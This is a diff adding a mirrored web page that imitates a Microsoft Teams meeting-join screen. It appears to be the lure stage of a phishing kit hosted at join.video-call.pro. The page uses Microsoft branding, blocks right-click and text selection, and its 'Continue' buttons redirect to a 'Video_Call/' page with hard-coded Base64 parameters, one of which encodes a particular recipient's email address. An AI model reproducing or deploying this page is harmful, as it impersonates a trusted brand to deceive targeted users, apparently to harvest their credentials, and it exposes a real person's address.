@@ -1,0 +1,179 @@
+
+
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Mirrored from join.video-call.pro/Teams/Join-01/Microsoft_Teams/?Join=MTc2OTQ0ODgxMw%3D%3D&auth=c2FsZXMwMDFAbGluZ2ZhbmNvb2xpbmcuY29tLmNu&Video=QWNhZGVteSA%3D by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 19 Feb 2026 10:53:03 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<meta http-equiv="content-type" content="text/html;charset=UTF-8" /> 
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>Join conversation on Teams</title>
+    <link rel="icon" type="image/png" href="images/logo2.png">
+    <link rel="stylesheet" type="text/css" href="css/style22.css">
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f3f2f1;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .login-container {
+            background-color: #ffffff;
+            padding: 40px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+            width: 360px;
+            text-align: center;
+        }
+
+        .login-container img.logo {
+            width: 100px;
+            height: auto;
+            max-width: 100%; 
+            margin-bottom: 30px;
+        }
+
+        .login-container h2 {
+            margin-bottom: 20px;
+            font-size: 24px;
+            color: #252423;
+        }
+
+        .login-container input[type="text"],
+        .login-container input[type="password"] {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 15px;
+            border: 1px solid #d1d1d1;
+            border-radius: 4px;
+            box-sizing: border-box;
+            font-size: 16px;
+        }
+
+        .login-container button {
+            width: 100%;
+            padding: 12px;
+            
+            
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+            transition: background-color 0.3s;
+             margin-bottom: 10px;
+        }
+
+
+.login-button  {
+    background-color: #5864A6; 
+
+
+  color: #ffffff;
+    /* Color for Sign Up button */
+}
+        .signup-button {
+    background-color: #f2f2f2; 
+
+
+    color: #000000;
+    /* Color for Sign Up button */
+}
+        
+
+        .login-button:hover {
+    background-color: #494b83; /* Darker shade for hover effect */
+}
+
+.signup-button:hover {
+    background-color: #d9d9d9; /* Darker shade for hover effect */
+}
+
+       
+
+        .login-container p {
+            margin-top: 20px;
+            color: #5e5e5e;
+            font-size: 14px;
+        }
+
+        .login-container a {
+            color: #6264a7;
+            text-decoration: none;
+        }
+
+        .login-container a:hover {
+            text-decoration: underline;
+        }
+
+        .login-container .footer-text {
+            font-size: 12px;
+            color: #777;
+            margin-top: 30px;
+        }
+    </style>
+</head>
+<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
+    <div class="login-container">
+          <img src="images/logo2.png" alt="Microsoft Teams Logo" class="logo">
+        <h3>Join your Teams meeting</h3>
+      
+    
+            <button class="login-button" id="btnSubmitMain" onClick="begin()">Continue on this browser</button>
+            <br> 
+             <button class="signup-button" id="btnSubmitMain" onClick="begin()">Join on the Teams app</button>
+
+        <p><a href="#">Can't access your account?</a></p>
+        <p class="footer-text">© 2026 Microsoft</p>
+    </div>
+    
+    
+    
+    
+   
+   
+   
+   <script>
+function begin() {
+        const urlParams = new URLSearchParams(window.location.search);
+        const auth = urlParams.get('auth')
+        if ((urlParams.get('auth') == undefined || urlParams.get('auth') == null)) {
+            $("#btnSubmitMain").attr("disabled", true)
+            loading("&nbsp;&nbsp;&nbsp; Loading...", "error")
+        } else {
+             const agent = "MTc2OTQ0ODgxMw==";
+			 const CompN = "QWNhZGVteSA=";
+			 const CompId = "c2FsZXMwMDFAbGluZ2ZhbmNvb2xpbmcuY29tLmNu";
+            window.location.href = "Video_Call/?Join=" + agent + "&Video=" + CompN + "&auth=" + CompId
+        }
+    }
+</script>
+ 
+ 
+ 
+ <script>
+
+		
+		
+	window.addEventListener("load", () => {
+  const loader = document.querySelector(".loader");
+
+  loader.classList.add("loader--hidden");
+
+  loader.addEventListener("transitionend", () => {
+    document.body.removeChild(loader);
+  });
+});	
+		
+</script>
+ <div class="loader"></div>   
+</body>
+
+<!-- Mirrored from join.video-call.pro/Teams/Join-01/Microsoft_Teams/?Join=MTc2OTQ0ODgxMw%3D%3D&auth=c2FsZXMwMDFAbGluZ2ZhbmNvb2xpbmcuY29tLmNu&Video=QWNhZGVteSA%3D by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 19 Feb 2026 10:53:04 GMT -->
+</html>
